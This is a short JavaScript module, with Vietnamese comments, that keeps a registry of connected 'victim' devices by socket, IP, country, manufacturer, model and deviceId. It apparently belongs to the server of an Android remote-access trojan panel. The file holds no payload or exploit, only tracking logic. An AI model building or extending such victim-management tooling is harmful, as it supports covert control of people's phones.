var Victim = function (socket, ip, port, country, manf, model, release, deviceId, note) {
    this.socket = socket;
    this.ip = ip;
    this.port = port;
    this.country = country;
    this.manf = manf;
    this.model = model;
    this.release = release;
    this.deviceId = deviceId; // Sử dụng deviceId thay vì fcmToken
    this.note = note || ''; // Thêm ghi chú
};





class Victims {
    constructor() {
        this.victimList = {};
        this.instance = this;
    }

    addVictim(socket, ip, port, country, manf, model, release, deviceId, note) {
        var victim = new Victim(socket, ip, port, country, manf, model, release, deviceId, note);
        this.victimList[deviceId] = victim;
    }

    getVictim(deviceId) {
        if (this.victimList[deviceId] != null)
            return this.victimList[deviceId];

        return -1;
    }

    rmVictim(deviceId) {
        delete this.victimList[deviceId];
    }

    getVictimList() {
        return this.victimList;
    }

    // Lấy deviceId của thiết bị
    getVictimDeviceId(deviceId) {
        if (this.victimList[deviceId]) {
            return this.victimList[deviceId].deviceId;
        }
        return null;
    }

    // Lấy ghi chú của thiết bị theo deviceId
    getVictimNote(deviceId) {
        if (this.victimList[deviceId]) {
            return this.victimList[deviceId].note || '';
        }
        return '';
    }

    // Cập nhật ghi chú cho thiết bị
    updateVictimNote(deviceId, note) {
        if (this.victimList[deviceId]) {
            this.victimList[deviceId].note = note;
            return true;
        }
        return false;
    }

    // Lấy tất cả deviceIds
    getAllDeviceIds() {
        const deviceIds = [];
        for (let id in this.victimList) {
            deviceIds.push({
                deviceId: id,
                device: `${this.victimList[id].manf} ${this.victimList[id].model}`
            });
        }
        return deviceIds;
    }

    // Lấy số lượng thiết bị online
    getOnlineCount() {
        return Object.keys(this.victimList).length;
    }
}


module.exports = new Victims();